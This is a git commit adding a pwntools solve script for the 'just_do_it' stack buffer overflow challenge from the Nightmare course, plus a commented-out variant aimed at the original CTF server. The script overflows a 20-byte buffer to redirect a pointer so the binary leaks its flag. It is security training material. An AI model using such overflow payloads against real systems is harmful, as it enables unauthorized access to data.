b857006842458c9abecc6905caf4711e4f933619
mhaatha <mhafidza528@gmail.com>
2026-09-02 12:33:26 +0800

    Nightmare Just Do It

---
+++ Nightmare/StackBufferOverflows/tw17_justdoit/solve.py
@@ -0,0 +1,27 @@
+from pwn import *
+
+io = process('./just_do_it')
+
+payload = b'A' * 20 + p32(0x0804a080)
+
+io.sendline(payload)
+
+io.interactive()
+
+# #Import pwntools
+# from pwn import *
+
+# #Create the remote connection to the challenge
+# target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)
+
+# #Print out the starting prompt
+# print target.recvuntil("password.\n")
+
+# #Create the payload
+# payload = "\x00"*20 + p32(0x0804a080)
+
+# #Send the payload
+# target.sendline(payload)
+
+# #Drop to an interactive shell, so we can read everything the server prints out
+# target.interactive()
